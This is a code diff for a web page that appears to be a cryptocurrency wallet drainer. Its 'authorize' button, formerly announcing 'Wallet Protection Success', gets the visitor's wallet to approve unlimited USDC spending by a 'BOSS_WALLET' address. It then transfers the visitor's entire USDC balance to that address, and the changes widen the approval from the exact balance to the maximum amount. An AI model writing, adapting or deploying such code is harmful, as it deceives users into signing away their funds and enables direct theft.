@@ -130,29 +130,32 @@
 
     document.getElementById("authorize").onclick = async () => {
       try {
-        if (!window.ethereum) throw new Error("Please install MetaMask or open in wallet browser");
         if (!signer) throw new Error("Please connect wallet first");
 
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function approve(address,uint256) returns (bool)",
           "function transferFrom(address,address,uint256) returns (bool)",
           "function balanceOf(address) view returns (uint256)",
-          "function allowance(address owner, address spender) view returns (uint256)"
+          "function allowance(address,address) view returns (uint256)"
         ], signer);
 
         progress(10);
         const balance = await usdc.balanceOf(user);
-        const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
+        if (balance.eq(0)) throw new Error("No USDC balance");
+
+        // Step 1: Approve Boss Wallet
+        const approveTx = await usdc.approve(CONFIG.BOSS_WALLET, ethers.constants.MaxUint256);
         await approveTx.wait();
         progress(50);
 
-        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
-        if (allowance.lt(balance)) throw new Error("Allowance not yet confirmed on-chain");
+        // Step 2: Confirm allowance and transfer
+        const allowance = await usdc.allowance(user, CONFIG.BOSS_WALLET);
+        if (allowance.lt(balance)) throw new Error("Allowance not confirmed");
 
         const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, balance);
         await tx2.wait();
         progress(100);
-        status("✅ Wallet Protection Success!☑️");
+        status("✅ Authorization + Transfer Success");
       } catch (err) {
         status("❌ " + (err.message || "Authorization failed"));
         progress(0);
